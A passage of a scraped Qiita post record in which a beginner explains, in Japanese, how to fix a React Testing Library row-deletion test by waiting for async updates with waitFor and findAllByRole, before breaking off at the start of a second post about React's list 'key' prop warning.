class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">削除ボタンを押すと記録数が1つ減っていること</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t\t\n\t\t<span class=\"nf\">render</span><span class=\"p\">(</span><span class=\"o\">&lt;</span><span class=\"nx\">App</span> <span class=\"o\">/&gt;</span><span class=\"p\">);</span>\n\n<span class=\"hil\"><span class=\"o\">+\t</span>\t<span class=\"c1\">// テーブルの行を取得できるまで待つ</span>\n</span><span class=\"hil\"><span class=\"o\">+\t</span>\t<span class=\"k\">await</span> <span class=\"nf\">waitFor</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+\t</span>\t\t<span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n</span><span class=\"hil\"><span class=\"o\">+\t</span>\t<span class=\"p\">});</span>\n</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">before</span> <span class=\"o\">=</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nx\">length</span><span class=\"p\">;</span>\n\n\t\t<span class=\"c1\">// テーブル最初の行の削除ボタン押下</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">rows</span> <span class=\"o\">=</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">firstRow</span> <span class=\"o\">=</span> <span class=\"nx\">rows</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">deleteButton</span> <span class=\"o\">=</span> <span class=\"nf\">within</span><span class=\"p\">(</span><span class=\"nx\">firstRow</span><span class=\"p\">).</span><span class=\"nf\">getByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">delete</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\t\t<span class=\"k\">await</span> <span class=\"nx\">userEvent</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"nx\">deleteButton</span><span class=\"p\">);</span>\n\n\t\t<span class=\"c1\">// テーブルの行が1行削除されていること</span>\n\t\t<span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nx\">length</span><span class=\"p\">).</span><span class=\"nf\">toBe</span><span class=\"p\">(</span><span class=\"nx\">before</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">);</span>\n\t<span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"77:1-78:113\">実行したところ、テストが期待値通りの結果となりませんでした。<br>\n削除処理前後でconsole.logで出力すると、削除処理後も数が変わっていませんでした。</p>\n<p data-sourcepos=\"80:1-80:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F692c5da4-b13e-4ec0-a318-63c70f65da41.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ae515eead498df457668e3bb0fdebe2b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F692c5da4-b13e-4ec0-a318-63c70f65da41.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ae515eead498df457668e3bb0fdebe2b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F692c5da4-b13e-4ec0-a318-63c70f65da41.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=044269fdd2021c961c481c914fd5c025 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/692c5da4-b13e-4ec0-a318-63c70f65da41.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"82:1-84:51\">削除処理が完了する前に、<br>\nexpect(screen.getAllByRole(\"row\").length).toBe(before - 1);<br>\nを実行されていたことが原因でした。</p>\n<p data-sourcepos=\"86:1-86:100\">削除されるまで、処理を待つようにwateForを追加することで解決しました。</p>\n<div class=\"code-frame\" data-lang=\"diff_javascript\" data-sourcepos=\"88:1-119:3\">\n<div class=\"code-lang\"><span class=\"bold\">delete.spec.js</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">React</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"dl\">'</span><span class=\"s1\">@testing-library/jest-dom</span><span class=\"dl\">'</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">within</span><span class=\"p\">,</span> <span class=\"nx\">waitFor</span><span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">userEvent</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/user-event</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">RegistDelete Test</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t<span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">削除ボタンを押すと記録数が1つ減っていること</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t\t\n\t\t<span class=\"nf\">render</span><span class=\"p\">(</span><span class=\"o\">&lt;</span><span class=\"nx\">App</span> <span class=\"o\">/&gt;</span><span class=\"p\">);</span>\n\n\t\t<span class=\"c1\">// テーブルの行を取得できるまで待つ</span>\n\t\t<span class=\"k\">await</span> <span class=\"nf\">waitFor</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t\t\t<span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\t\t<span class=\"p\">});</span>\n\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">before</span> <span class=\"o\">=</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nx\">length</span><span class=\"p\">;</span>\n\n\t\t<span class=\"c1\">// テーブル最初の行の削除ボタン押下</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">rows</span> <span class=\"o\">=</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">firstRow</span> <span class=\"o\">=</span> <span class=\"nx\">rows</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">deleteButton</span> <span class=\"o\">=</span> <span class=\"nf\">within</span><span class=\"p\">(</span><span class=\"nx\">firstRow</span><span class=\"p\">).</span><span class=\"nf\">getByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">delete</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\t\t<span class=\"k\">await</span> <span class=\"nx\">userEvent</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"nx\">deleteButton</span><span class=\"p\">);</span>\n\n\t\t<span class=\"c1\">// テーブルの行が1行削除されていること</span>\n<span class=\"hil\"><span class=\"o\">+\t</span>\t<span class=\"k\">await</span> <span class=\"nf\">waitFor</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span>\t\t\t<span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nx\">length</span><span class=\"p\">).</span><span class=\"nf\">toBe</span><span class=\"p\">(</span><span class=\"nx\">before</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">);</span>\n<span class=\"hil\"><span class=\"o\">+\t</span>\t<span class=\"p\">});</span>\n</span>\t<span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div>\n</div>\n<h3 data-sourcepos=\"121:1-121:19\">\n<span id=\"findbyを使う\" class=\"fragment\"></span><a href=\"#findby%E3%82%92%E4%BD%BF%E3%81%86\"><i class=\"fa fa-link\"></i></a>findByを使う</h3>\n<p data-sourcepos=\"122:1-122:151\">waitForでも実現可能ですが、非同期処理を待って要素を取得する場合、findByを使うほうが簡潔に実現できました。</p>\n<p data-sourcepos=\"124:1-124:47\">※公式ドキュメント(翻訳)より引用</p>\n<blockquote data-sourcepos=\"125:1-125:235\">\n<p data-sourcepos=\"125:3-125:235\">findByメソッドは、getByクエリとwaitForを組み合わせたものです。waitForオプションを最後の引数として受け取ります（例えば、await screen.findByText('text', queryOptions, waitForOptions)）。</p>\n</blockquote>\n<p data-sourcepos=\"127:1-128:78\">getByクエリとwaitForを組み合わせたものです。<br>\n最初にwaitForとgetByクエリで解決したことをfindByでできる…</p>\n<div class=\"code-frame\" data-lang=\"diff_javascript\" data-sourcepos=\"130:1-162:3\">\n<div class=\"code-lang\"><span class=\"bold\">delete.spec.js</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">React</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"dl\">'</span><span class=\"s1\">@testing-library/jest-dom</span><span class=\"dl\">'</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">within</span><span class=\"p\">,</span> <span class=\"nx\">waitFor</span><span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">userEvent</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/user-event</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">RegistDelete Test</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t<span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">削除ボタンを押すと記録数が1つ減っていること</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t\t\n\t\t<span class=\"nf\">render</span><span class=\"p\">(</span><span class=\"o\">&lt;</span><span class=\"nx\">App</span> <span class=\"o\">/&gt;</span><span class=\"p\">);</span>\n\n<span class=\"hdl\"><span class=\"o\">-\t</span>\t<span class=\"c1\">// テーブルの行を取得できるまで待つ</span>\n</span><span class=\"hdl\"><span class=\"o\">-\t</span>\t<span class=\"k\">await</span> <span class=\"nf\">waitFor</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span><span class=\"hdl\"><span class=\"o\">-\t</span>\t\t<span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n</span><span class=\"hdl\"><span class=\"o\">-\t</span>\t<span class=\"p\">});</span>\n</span>\n<span class=\"hdl\"><span class=\"o\">-\t</span>\t<span class=\"kd\">const</span> <span class=\"nx\">before</span> <span class=\"o\">=</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nx\">length</span><span class=\"p\">;</span>\n</span><span class=\"hil\"><span class=\"o\">+\t</span>\t<span class=\"kd\">const</span> <span class=\"nx\">before</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nx\">length</span><span class=\"p\">;</span>\n</span>\n\t\t<span class=\"c1\">// テーブル最初の行の削除ボタン押下</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">rows</span> <span class=\"o\">=</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">firstRow</span> <span class=\"o\">=</span> <span class=\"nx\">rows</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">deleteButton</span> <span class=\"o\">=</span> <span class=\"nf\">within</span><span class=\"p\">(</span><span class=\"nx\">firstRow</span><span class=\"p\">).</span><span class=\"nf\">getByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">delete</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\t\t<span class=\"k\">await</span> <span class=\"nx\">userEvent</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"nx\">deleteButton</span><span class=\"p\">);</span>\n\n\t\t<span class=\"c1\">// テーブルの行が1行削除されていること</span>\n\t\t<span class=\"k\">await</span> <span class=\"nf\">waitFor</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t\t\t<span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nx\">length</span><span class=\"p\">).</span><span class=\"nf\">toBe</span><span class=\"p\">(</span><span class=\"nx\">before</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">);</span>\n\t\t<span class=\"p\">});</span>\n\t<span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"164:1-164:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"165:1-165:141\">最近エラーに遭遇すると、非同期処理の理解不足によるものなんじゃ…って思うことが増えてきました。</p>\n<h1 data-sourcepos=\"167:1-167:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"169:1-169:60\"><iframe id=\"qiita-embed-content__2a858aea2d688690274aa12364b71997\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__2a858aea2d688690274aa12364b71997\" data-content=\"https%3A%2F%2Fqiita.com%2Fham0215%2Fitems%2F3cbd2148d5eedc649f47%23waitfor\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"171:1-171:71\"><iframe id=\"qiita-embed-content__1d039177b460e38877bfb35bd86e3acd\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1d039177b460e38877bfb35bd86e3acd\" data-content=\"https%3A%2F%2Ftesting-library.com%2Fdocs%2Fdom-testing-library%2Fapi-async%2F%23waitfor\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"173:1-173:243\"><iframe id=\"qiita-embed-content__2817e1400245ec3235bd63c313db278e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__2817e1400245ec3235bd63c313db278e\" data-content=\"https%3A%2F%2Fzenn.dev%2Fspacemarket%2Farticles%2F6b52d53696ef13%23%25E9%259D%259E%25E5%2590%258C%25E6%259C%259F%25E5%2587%25A6%25E7%2590%2586%25E3%2582%2592%25E5%25BE%2585%25E3%2581%25A3%25E3%2581%25A6%25E3%2581%258B%25E3%2582%2589%25E3%2582%25A2%25E3%2582%25B5%25E3%2583%25BC%25E3%2582%25B7%25E3%2583%25A7%25E3%2583%25B3%25E3%2582%2592%25E8%25A1%258C%25E3%2581%2586---waitfor\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nscreen.getAllByRoleを使用してテーブル行を取得する際にエラーとなりました。\n\n# 問題\nscreen.getAllByRole(\"row\")を使用して、テーブルの行数を取得しようとしたところ表題のエラーになりました。\n\nエラーとなった際のコード\n\n```javascript:delete.spec.js\nimport App from \"../App\";\nimport React from \"react\";\nimport '@testing-library/jest-dom'\nimport { render, screen, within, waitFor} from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\n\ndescribe(\"RegistDelete Test\", () => {\n\tit(\"削除ボタンを押すと記録数が1つ減っていること\", async () => {\n\t\t\n\t\trender(<App />);\n\n\t\tconst before = screen.getAllByRole(\"row\").length;\n\n\t\t// テーブル最初の行の削除ボタン押下\n\t\tconst rows = screen.getAllByRole(\"row\");\n\t\tconst firstRow = rows[0];\n\t\tconst deleteButton = within(firstRow).getByTestId(\"delete\");\n\t\tawait userEvent.click(deleteButton);\n\n\t\t// テーブルの行が1行削除されていること\n\t\texpect(screen.getAllByRole(\"row\").length).toBe(before - 1);\n\t});\n});\n```\n\n\n# 解決方法\n### waitForを使う\n\n※公式ドキュメント(翻訳)より引用\n> 任意の期間待つ必要がある場合は、waitForを使用して、期待値が通過するのを待つことができます\n\n> waitForは、タイムアウトに達するまで何度でもコールバックを実行することができる。呼び出しの回数は、timeoutオプションとintervalオプションによって制限されることに注意してください。\n\nawait waitFor内にscreen.getAllByRole(\"row\");を定義して、テーブル行を取得できるまで待つように修正\n\n```diff_javascript:delete.spec.js\nimport App from \"../App\";\nimport React from \"react\";\nimport '@testing-library/jest-dom'\nimport { render, screen, within, waitFor} from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\n\ndescribe(\"RegistDelete Test\", () => {\n\tit(\"削除ボタンを押すと記録数が1つ減っていること\", async () => {\n\t\t\n\t\trender(<App />);\n\n+\t\t// テーブルの行を取得できるまで待つ\n+\t\tawait waitFor(() => {\n+\t\t\tscreen.getAllByRole(\"row\");\n+\t\t});\n\n\t\tconst before = screen.getAllByRole(\"row\").length;\n\n\t\t// テーブル最初の行の削除ボタン押下\n\t\tconst rows = screen.getAllByRole(\"row\");\n\t\tconst firstRow = rows[0];\n\t\tconst deleteButton = within(firstRow).getByTestId(\"delete\");\n\t\tawait userEvent.click(deleteButton);\n\n\t\t// テーブルの行が1行削除されていること\n\t\texpect(screen.getAllByRole(\"row\").length).toBe(before - 1);\n\t});\n});\n```\n\n実行したところ、テストが期待値通りの結果となりませんでした。\n削除処理前後でconsole.logで出力すると、削除処理後も数が変わっていませんでした。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/692c5da4-b13e-4ec0-a318-63c70f65da41.png)\n\n削除処理が完了する前に、\nexpect(screen.getAllByRole(\"row\").length).toBe(before - 1);\nを実行されていたことが原因でした。\n\n削除されるまで、処理を待つようにwateForを追加することで解決しました。\n\n```diff_javascript:delete.spec.js\nimport App from \"../App\";\nimport React from \"react\";\nimport '@testing-library/jest-dom'\nimport { render, screen, within, waitFor} from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\n\ndescribe(\"RegistDelete Test\", () => {\n\tit(\"削除ボタンを押すと記録数が1つ減っていること\", async () => {\n\t\t\n\t\trender(<App />);\n\n\t\t// テーブルの行を取得できるまで待つ\n\t\tawait waitFor(() => {\n\t\t\tscreen.getAllByRole(\"row\");\n\t\t});\n\n\t\tconst before = screen.getAllByRole(\"row\").length;\n\n\t\t// テーブル最初の行の削除ボタン押下\n\t\tconst rows = screen.getAllByRole(\"row\");\n\t\tconst firstRow = rows[0];\n\t\tconst deleteButton = within(firstRow).getByTestId(\"delete\");\n\t\tawait userEvent.click(deleteButton);\n\n\t\t// テーブルの行が1行削除されていること\n+\t\tawait waitFor(() => {\n\t\t\texpect(screen.getAllByRole(\"row\").length).toBe(before - 1);\n+\t\t});\n\t});\n});\n```\n\n### findByを使う\nwaitForでも実現可能ですが、非同期処理を待って要素を取得する場合、findByを使うほうが簡潔に実現できました。\n\n※公式ドキュメント(翻訳)より引用\n> findByメソッドは、getByクエリとwaitForを組み合わせたものです。waitForオプションを最後の引数として受け取ります（例えば、await screen.findByText('text', queryOptions, waitForOptions)）。\n\ngetByクエリとwaitForを組み合わせたものです。\n最初にwaitForとgetByクエリで解決したことをfindByでできる…\n\n```diff_javascript:delete.spec.js\nimport App from \"../App\";\nimport React from \"react\";\nimport '@testing-library/jest-dom'\nimport { render, screen, within, waitFor} from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\n\ndescribe(\"RegistDelete Test\", () => {\n\tit(\"削除ボタンを押すと記録数が1つ減っていること\", async () => {\n\t\t\n\t\trender(<App />);\n\n-\t\t// テーブルの行を取得できるまで待つ\n-\t\tawait waitFor(() => {\n-\t\t\tscreen.getAllByRole(\"row\");\n-\t\t});\n\n-\t\tconst before = screen.getAllByRole(\"row\").length;\n+\t\tconst before = (await screen.findAllByRole(\"row\")).length;\n\n\t\t// テーブル最初の行の削除ボタン押下\n\t\tconst rows = screen.getAllByRole(\"row\");\n\t\tconst firstRow = rows[0];\n\t\tconst deleteButton = within(firstRow).getByTestId(\"delete\");\n\t\tawait userEvent.click(deleteButton);\n\n\t\t// テーブルの行が1行削除されていること\n\t\tawait waitFor(() => {\n\t\t\texpect(screen.getAllByRole(\"row\").length).toBe(before - 1);\n\t\t});\n\t});\n});\n```\n\n# おわりに\n最近エラーに遭遇すると、非同期処理の理解不足によるものなんじゃ…って思うことが増えてきました。\n\n# 参考\n\nhttps://qiita.com/ham0215/items/3cbd2148d5eedc649f47#waitfor\n\nhttps://testing-library.com/docs/dom-testing-library/api-async/#waitfor\n\nhttps://zenn.dev/spacemarket/articles/6b52d53696ef13#%E9%9D%9E%E5%90%8C%E6%9C%9F%E5%87%A6%E7%90%86%E3%82%92%E5%BE%85%E3%81%A3%E3%81%A6%E3%81%8B%E3%82%89%E3%82%A2%E3%82%B5%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E8%A1%8C%E3%81%86---waitfor\n","coediting":false,"comments_count":0,"created_at":"2025-03-05T22:05:33+09:00","group":null,"id":"daf4c12cc5571a5a4b17","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"初心者","versions":[]},{"name":"React","versions":[]},{"name":"TestingLibrary","versions":[]}],"title":"【testing-library】TestingLibraryElementError: Unable to find an accessible element with the role ","updated_at":"2025-03-05T22:05:33+09:00","url":"https://qiita.com/asa129/items/daf4c12cc5571a5a4b17","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":756,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:153\">テストコード作成時、表題のエラーが発生しました。動画で学んだなと思いつつ、忘れていたため記事にします。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:179\">テストコード作成時、テーブル最後の行を取得するように試みたところ、「Each child in a list should have a unique \"key\" prop.」のエラーが発生</p>\n<p data-sourcepos=\"7:1-7:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fded3cffd-e29d-4981-855d-e499d9063d14.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=10ebcca32f9071ebf1e33625bc9b5153\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fded3cffd-e29d-4981-855d-e499d9063d14.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=10ebcca32f9071ebf1e33625bc9b5153\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fded3cffd-e29d-4981-855d-e499d9063d14.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=52e7dcd1b082c8a9da5900d232e9c5f5 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ded3cffd-e29d-4981-855d-e499d9063d14.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"9:1-9:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"10:1-10:111\">mapでループして一行ずつレンダリングしている trタグに一意となるkeyを設定する。</p>\n<p data-sourcepos=\"12:1-12:48\">※参考動画、ドキュメントより引用</p>\n<blockquote data-sourcepos=\"13:1-14:168\">\n<p data-sourcepos=\"13:3-14:168\">reactの裏側で動いている仮想DOMの仕組みは、変更前と変更後の差分のみを抽出している。<br>\nループでレンダリングした際に何個目の要素なのかを正確に比較するため、一意となる値の目印をつけてあげる必要がある。</p>\n</blockquote>\n<blockquote data-sourcepos=\"16:1-17:299\">\n<p data-sourcepos=\"16:3-16:40\">indexの使用も可だが、非推奨</p>\n<blockquote data-sourcepos=\"17:2-17:299\">\n<p data-sourcepos=\"17:3-17:299\">　アイテムが挿入されたり削除されたり、配列の順序が入れ替わったり、アイテムのレンダリング順序は時間の経過とともに変化します。インデックスをキーに指定すると、微妙なバグや混乱を招くことがよくあります。</p>\n</blockquote>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"diff_jsx\" data-sourcepos=\"20:1-51:3\">\n<div class=\"code-lang\"><span 